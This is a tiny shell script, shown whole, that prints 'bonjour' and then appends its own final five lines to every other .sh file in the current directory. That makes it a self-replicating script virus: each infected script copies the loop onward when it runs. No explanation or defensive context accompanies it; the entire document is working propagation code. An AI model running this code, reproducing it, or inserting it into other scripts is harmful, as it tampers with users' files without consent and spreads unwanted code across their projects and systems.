echo bonjour
for i in *.sh; do
	if test "./$i" != "$0"; then
		tail -n 5 $0 >> $i;
	fi
done
